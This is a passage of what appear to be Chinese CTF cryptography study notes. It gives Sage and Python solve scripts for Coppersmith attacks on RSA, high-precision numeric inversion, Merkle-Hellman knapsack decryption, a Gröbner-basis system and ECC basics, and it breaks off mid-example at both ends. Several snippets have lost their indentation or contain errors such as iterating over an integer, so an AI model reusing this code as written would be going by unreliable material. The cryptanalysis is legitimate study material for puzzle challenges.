class="line">24</span><br></pre></td><td class="code"><pre><span class="line">n = ...</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = ...</span><br><span class="line">hint = ...</span><br><span class="line"></span><br><span class="line">missing_bits = <span class="number">643</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算p_known = p_high &lt;&lt; missing_bits</span></span><br><span class="line">p_known = hint * (<span class="number">2</span> ** missing_bits)</span><br><span class="line"><span class="comment"># 定义多项式</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (x + p_known)**<span class="number">3</span></span><br><span class="line"><span class="comment"># X是未知位的最大和值</span></span><br><span class="line">X = <span class="number">2</span> ** missing_bits  <span class="comment"># 因为x小于2^940</span></span><br><span class="line">roots = f.small_roots(X=X, beta=<span class="number">0.5</span>, epsilon=<span class="number">0.02</span>)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">x0 = roots[<span class="number">0</span>]</span><br><span class="line">p = p_known + x0</span><br><span class="line"><span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p found:&quot;</span>, p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Found candidate but not factor.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;No roots found.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="已知明文低位求高位">已知明文低位求高位</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">stutter</span>(<span class="params">text, cipher = <span class="literal">None</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(text):</span><br><span class="line">        t = random.randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">        subtext = text[i:i+t] + <span class="string">&#x27;...&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(subtext <span class="keyword">if</span> cipher <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> cipher(subtext))</span><br><span class="line">        i += t</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encipherer</span>(<span class="params">N, e = <span class="number">0x10001</span>, l = <span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encipher</span>(<span class="params">m</span>):</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(pad(m.encode(<span class="string">&#x27;utf-8&#x27;</span>), l)), e, N)).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> _encipher</span><br><span class="line">e = <span class="number">13</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    N = p * q</span><br><span class="line">    <span class="keyword">if</span> GCD((p-<span class="number">1</span>)*(q-<span class="number">1</span>), e) == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">stutter(flag, encipherer(N, e))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;N = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>首先,pad是长度一定答案一定的,其次,长度只有6种,所以我们近似得到了明文绝大多数低位.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tmp=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">tmp=tmp+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">out=tmp+<span class="string">b&#x27;...&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(pad(out,<span class="number">256</span>)))</span><br></pre></td></tr></table></figure><p>首先得到没了flag的时候上面的低位(6种情况),然后构造coppersmith(deepseek给的板子,Flu没审计代码就直接用了,错了再说):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">cc=[<span class="comment"># 给出的密文</span></span><br><span class="line">,</span><br><span class="line">]</span><br><span class="line">clow=[<span class="comment"># 明文低位</span></span><br><span class="line">,</span><br><span class="line">]</span><br><span class="line">N = ...</span><br><span class="line">e = <span class="number">13</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cc:</span><br><span class="line"><span class="keyword">for</span> low_m <span class="keyword">in</span> clow:</span><br><span class="line">unknown_bits = <span class="number">48</span> <span class="comment"># 未知的位数（6字节=48位）</span></span><br><span class="line"><span class="comment"># 构造多项式：f(x) = (x * 2^known_bits + low_m)^e - c mod N</span></span><br><span class="line">known_bits = <span class="number">250</span> * <span class="number">8</span>  <span class="comment"># 已知250字节，即2000位</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line"><span class="comment"># 定义多项式：f(x) = (x * 2^known_bits + low_m)^e - c</span></span><br><span class="line">f = ((x * <span class="number">2</span>^known_bits + low_m)^e - c).monic()</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^unknown_bits, beta=<span class="number">1.0</span>, epsilon=<span class="number">0.05</span>)</span><br><span class="line"><span class="keyword">if</span> x0:</span><br><span class="line">x0 = x0[<span class="number">0</span>]</span><br><span class="line">high_m = x0</span><br><span class="line">total_m = high_m * <span class="number">2</span>^known_bits + low_m</span><br><span class="line"><span class="built_in">print</span>(total_m)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;No solutions found&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>后知后觉</strong> :之前看hint说,e很小的时候,Flu只觉得可能和什么爆破有关,查了一下发现也不是直接开根号的板子,因为明文和N差不多大.<br>直到ds给出脚本的时候才发现e和多项式阶数直接相关,没准e大点就解不出来了…</p><h2 id="大数处理">大数处理</h2><p>就是,给定一个很大的数的函数,输出一个小数,一般在密码学都是什么神秘暴力展开,然后做了一些神秘的操作,由于展开太费时间,用二分的check都得算好几个小时…<br>于是这里记录sage怎么写.</p><h3 id="task1">task1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MySeries</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num</span>):</span><br><span class="line">        self.num = num</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Coe</span>(<span class="params">self, n</span>):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        c = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; n:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            c = (c * (<span class="number">1</span> / <span class="number">2</span> - i + <span class="number">1</span>)) / i</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Point</span>(<span class="params">self, center</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        center -= <span class="number">1</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; self.num:</span><br><span class="line">            <span class="built_in">sum</span> += (center ** (<span class="number">1</span> / <span class="number">2</span> - i) * self.Coe(i))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">All</span>(<span class="params">bound</span>):</span><br><span class="line">    num = randint(<span class="number">1111</span>, <span class="number">2222</span>)</span><br><span class="line">    T = MySeries(num)</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; bound:</span><br><span class="line">        b1 = T.Point(i)</span><br><span class="line">        b2 = T.Point(i + <span class="number">1</span>)</span><br><span class="line">        output += (b1 + b2) / <span class="number">2</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line">k = <span class="built_in">int</span>(All(n))</span><br></pre></td></tr></table></figure><p>给定函数其实是在通过梯形法则计算$$\int_3^{bound}\sqrt x\mathrm dx$$那么解密脚本(sage,只求高位)大致如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F = RealField(<span class="number">20000</span>)<span class="comment"># 定义实数域是20000位2进制</span></span><br><span class="line">n=F(<span class="string">&#x27;1145141919810&#x27;</span>)<span class="comment"># 域上的数字</span></span><br><span class="line">kk=<span class="built_in">int</span>(<span class="number">2</span>*n**(<span class="number">3</span>/<span class="number">2</span>)/<span class="number">3</span>-<span class="number">2</span>*<span class="number">3</span>**(<span class="number">1</span>/<span class="number">2</span>))<span class="comment"># 直接算积分答案</span></span><br><span class="line">kk<span class="comment"># 输出</span></span><br></pre></td></tr></table></figure><h3 id="task2">task2</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getcontext().prec = <span class="number">1145</span></span><br><span class="line">a = Decimal(N2-<span class="number">10</span>**<span class="number">615</span>)/(N2+<span class="number">10</span>**<span class="number">615</span>)</span><br><span class="line">b = Decimal(N2**<span class="number">2</span>-<span class="number">2</span>*<span class="number">10</span>**<span class="number">615</span>*N2+<span class="number">10</span>**<span class="number">1230</span>)/(N2**<span class="number">2</span>+<span class="number">2</span>*<span class="number">10</span>**<span class="number">615</span>*N2+<span class="number">10</span>**<span class="number">1230</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> funky <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18905</span>):</span><br><span class="line">    c += a/i</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">    a *= b</span><br><span class="line">c *= <span class="number">2</span></span><br><span class="line">Q2 = c</span><br></pre></td></tr></table></figure><p>给定函数在求这个东西:$$x=\frac{N-10^{615}}{N+10^{615}},Q=\frac x1+\frac {x^3}{3}+\frac {x^5}5+…$$问AI告诉我说后面在拟合这个函数:$$\ln\left(\frac{1+x}{1-x}\right)$$回带得到了这个脚本(sage):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F = RealField(<span class="number">13300</span>)</span><br><span class="line">Q2 = F(<span class="string">&#x27;2.1145141919810&#x27;</span>)</span><br><span class="line">c2 = <span class="number">1145141919810</span></span><br><span class="line">N2 = <span class="built_in">round</span>(exp(Q2) * <span class="number">10</span>**<span class="number">615</span>)</span><br></pre></td></tr></table></figure><h3 id="task3">task3</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getcontext().prec = <span class="number">4000</span></span><br><span class="line">a = Decimal(N3)</span><br><span class="line">b = Decimal(<span class="number">1</span>)/<span class="number">40000</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> baka <span class="keyword">in</span> <span class="number">40000</span>:</span><br><span class="line">    c += Decimal(<span class="number">10</span>**<span class="number">1860</span>)/(a**<span class="number">3</span> + <span class="number">1</span>)</span><br><span class="line">    a += b</span><br><span class="line">c *= Decimal(<span class="number">1</span>)/<span class="number">40000</span></span><br><span class="line">Q3 = c</span><br></pre></td></tr></table></figure><p>问AI得到是在拟合这个东西:$$\int_{N3}^{N3+1}\frac{10^{1860}}{x^3+1}\mathrm dx$$这就不能用一般的定积分计算了,问AI求积分得到了一个非常复杂的式子,考虑有没有其他解法:</p><p>观察到在N3特别大的时候,1/(x^3+1)曲线非常非常平缓,所以近似成一条直线,且可以近似成一条平行x轴的直线,据此我们可以写出:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F = RealField(<span class="number">13300</span>)</span><br><span class="line">Q3 = F(<span class="string">&#x27;53386726097.1145141919810&#x27;</span>)</span><br><span class="line">c3 = <span class="number">1145141919810</span></span><br><span class="line">N3 = <span class="built_in">round</span>((<span class="number">10</span>**<span class="number">1860</span>/Q3-<span class="number">1</span>)**(<span class="number">1</span>/<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h2 id="Knapsnack">Knapsnack</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密脚本</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt; <span class="number">48</span></span><br><span class="line">n = <span class="number">48</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    w = []</span><br><span class="line">    w.append(getRandomNBitInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">        w.append(<span class="number">2</span>*w[-<span class="number">1</span>] + random.getrandbits(w[-<span class="number">1</span>].bit_length()))</span><br><span class="line">    q = <span class="number">2</span>*w[-<span class="number">1</span>] + random.getrandbits(w[-<span class="number">1</span>].bit_length())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = random.randrange(q)</span><br><span class="line">        <span class="keyword">if</span> GCD(r, q) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    b = [ww*r % q <span class="keyword">for</span> ww <span class="keyword">in</span> w]</span><br><span class="line">    pkey = b</span><br><span class="line">    skey = (w, q, r)</span><br><span class="line">    <span class="keyword">return</span> pkey, skey</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text: <span class="built_in">bytes</span>, pkey</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit, bb <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;b:08b&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> text).zfill(n)), pkey):</span><br><span class="line">        c += bit * bb</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">pkey, skey = keygen()</span><br><span class="line">c = encrypt(flag, pkey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mh_decrypt</span>(<span class="params">c: <span class="built_in">int</span>, skey: <span class="type">Tuple</span>[<span class="type">List</span>[<span class="built_in">int</span>], <span class="built_in">int</span>, <span class="built_in">int</span>], n_bits: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Decrypt Merkle–Hellman knapsack ciphertext given secret key (w, q, r).</span></span><br><span class="line"><span class="string">    - c: message</span></span><br><span class="line"><span class="string">    - skey: (w, q, r) where w is the superincreasing sequence (list), q modulus, r multiplier</span></span><br><span class="line"><span class="string">    - n_bits: length of the array (e.g. 48*8 for the challenge)</span></span><br><span class="line"><span class="string">    Returns decrypted bytes (with left-zero bytes stripped).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w, q, r = skey</span><br><span class="line">    <span class="comment"># modular inverse of r mod q</span></span><br><span class="line">    r_inv = <span class="built_in">pow</span>(r, -<span class="number">1</span>, q)</span><br><span class="line">    <span class="comment"># multiply ciphertext by inverse to remove multiplier (mod q)</span></span><br><span class="line">    c_prime = (c * r_inv) % q</span><br><span class="line">    <span class="comment"># now c_prime should equal sum(b_i * w_i) where b_i in &#123;0,1&#125;</span></span><br><span class="line">    bits = [<span class="number">0</span>] * <span class="built_in">len</span>(w)</span><br><span class="line">    <span class="comment"># Greedy recover since w is superincreasing: go from largest to smallest</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(w)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> c_prime &gt;= w[i]:</span><br><span class="line">            bits[i] = <span class="number">1</span></span><br><span class="line">            c_prime -= w[i]</span><br><span class="line">    <span class="comment"># bits is a list of 0/1, MSB at index 0 if encryption used left-to-right order.</span></span><br><span class="line">    bitstring = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bits)</span><br><span class="line">    <span class="comment"># Ensure bitstring length is n_bits (zfill was used in encryption)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bitstring) &lt; n_bits:</span><br><span class="line">        bitstring = bitstring.zfill(n_bits)</span><br><span class="line">    <span class="comment"># Convert bitstring (big-endian) to integer and then to bytes</span></span><br><span class="line">    value = <span class="built_in">int</span>(bitstring, <span class="number">2</span>)</span><br><span class="line">    out_bytes = value.to_bytes(n_bits // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="comment"># Original plaintext was right-aligned into n_bits via zfill, so strip leading null bytes</span></span><br><span class="line">    <span class="keyword">return</span> out_bytes.lstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">flag=mh_decrypt(c,skey,<span class="number">48</span>*<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Grobner基">Gröbner基</h2><p>一个解方程的神秘算法,实际上只会写脚本就行了…</p><h3 id="例题1">例题1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">103</span></span><br><span class="line">x = getrandbits(<span class="number">4096</span>)</span><br><span class="line">a = (phi**<span class="number">3</span> + x*d**<span class="number">2</span> + (x**<span class="number">2</span> + x*phi + <span class="number">3</span>*d)**<span class="number">2</span>) % n</span><br><span class="line">b = (x**<span class="number">2</span> - <span class="number">3</span>*x + x*d**<span class="number">3</span>*phi + d**<span class="number">2</span> - <span class="number">13</span>*phi**<span class="number">2</span>) % n</span><br><span class="line">c = (phi**<span class="number">2</span> + <span class="number">7</span>*phi - x**<span class="number">2</span>*d + x - d**<span class="number">2</span>) % n</span><br></pre></td></tr></table></figure><p>首先,直接按照这个神秘算法是解不出来的…太复杂了…<br>问了管理员(这是&quot;魔法少女网站&quot;吗?一道题必须问管理员才做得出来)才发现,原来是少了一个隐藏条件(ed=1 mod phi这个).<br>然后管理员说,e很小,所以考虑直接爆破k得到第四个条件,然后写解密脚本.<br>最后将x取模意义下的反值,带入原方程构造:(这个是最终的脚本,大差不差的)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n=</span><br><span class="line">e=</span><br><span class="line">a_val=</span><br><span class="line">b_val=</span><br><span class="line">c_val=</span><br><span class="line">k=</span><br><span class="line">x=</span><br><span class="line">R.&lt;phi,d&gt;=PolynomialRing(Zmod(n),<span class="number">2</span>)<span class="comment"># 几个未知数</span></span><br><span class="line">f1=phi**<span class="number">3</span>+x*d**<span class="number">2</span>+(x**<span class="number">2</span>+x*phi+<span class="number">3</span>*d)**<span class="number">2</span>-a</span><br><span class="line">f2=x**<span class="number">2</span>-<span class="number">3</span>*x+x*d**<span class="number">3</span>*phi+d**<span class="number">2</span>-<span class="number">13</span>*phi**<span class="number">2</span>-b</span><br><span class="line">f3=phi**<span class="number">2</span>+<span class="number">7</span>*phi-x**<span class="number">2</span>*d+x-d**<span class="number">2</span>-c</span><br><span class="line">f4=e*d-k*phi-<span class="number">1</span></span><br><span class="line">I=R.ideal(f1,f2,f3,f4)</span><br><span class="line">groebner_basis=I.groebner_basis()</span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> groebner_basis:</span><br><span class="line"><span class="comment"># print(g)</span></span><br><span class="line"><span class="keyword">if</span> g.variables() == (d,): <span class="comment"># 如果多项式只包含d</span></span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line"><span class="keyword">if</span> g.variables() == (phi,): <span class="comment"># 如果多项式只包含phi</span></span><br><span class="line"><span class="built_in">print</span>(g)</span><br></pre></td></tr></table></figure><p>然后得到d和phi,随便挑一个就能解.</p><h2 id="ECC-椭圆曲线加密">ECC 椭圆曲线加密</h2><p>公开: P,Q两点 a,b椭圆曲线参数保留: k(Q=kP的k)</p><p>加密:随机数字r,求出(rP,msg+rQ)<br>解密:使用私钥k,求出krP=rQ,做差得到msg.</p><p><strong>注意</strong> :假如知道Q=k*P,已知Q和k是反推不出来P的,因为不知道逆元(这里是没有点减法的)…</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)<span class="comment"># 随机模数</span></span><br><span class="line">F = GF(p)<span class="comment"># 限定域</span></span><br><span class="line">E = EllipticCurve(F, [<span class="number">114</span>, <span class="number">514</span>])<span class="comment"># 参数a,b,这是最简单的形式E: y^2 = x^3 + ax + b</span></span><br><span class="line"></span><br><span class="line">P = E.random_point()<span class="comment"># 随机初始点P</span></span><br><span class="line">Q1 = P*<span class="number">1145141919810893</span><span class="comment"># 第一个公钥点</span></span><br><span class="line">Q2 = P*<span class="number">1337133713371337</span><span class="comment"># 第二个公钥点</span></span><br><span class="line"></span><br><span class="line">P.x()<span class="comment"># P点的x坐标</span></span><br><span class="line">P.xy()<span class="comment"># P点的x坐标</span></span><br><span class="line">P.order()<span class="comment"># P点的阶</span></span><br><span class="line"></span><br><span class="line">PP=k*Q<span class="comment"># sage会自动进行圆锥曲线的运算</span></span><br></pre></td></tr></table></figure><h3 id="知道两个Q和对应的k求P">知道两个Q和对应的k求P</h3><p>前提:两个k互质.<br>尝试理解点之间变换的精髓: $P=xQ_1+yQ_2=xk_1Q_1+yk_2Q_2$</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g,u,v=xgcd(k1,k2)   <span class="comment"># Sage 内置扩展欧几里得函数</span></span><br><span class="line">P=u*Q1+v*Q2</span><br></pre></td></tr></table></figure><h3 id="未知P-a-b-mod-已知2P-3P-…-7P">未知P,a,b,mod,已知2P,3P,…,7P</h3><p>ab显然解方程就行了.关键在于p怎么算:<br>把多组数据带进去,做差能得到关于mod的倍数.<br>对很多个这样的倍数求gcd即可求出mod.至此原ECC全部还原,直接求PQ还原答案即可.</p><h3 id="ECDLP-椭圆曲线离散对数">ECDLP 椭圆曲线离散对数</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = getRandomNBitInteger(<span class="number">136</span>)</span><br><span class="line">p = <span class="number">85468147895711151675202050796503571876819967288648016286940998128295841240719</span></span><br><span class="line">F = GF(p)</span><br><span class="line">E = EllipticCurve(GF(p), [<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">P = E.gens()[<span class="number">0</span>]</span><br><span class="line">Q = k*P</span><br><span class="line">ct = AES.new(hashlib.sha256(<span class="built_in">str</span>(k).encode()).digest(), AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;P.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Q = <span 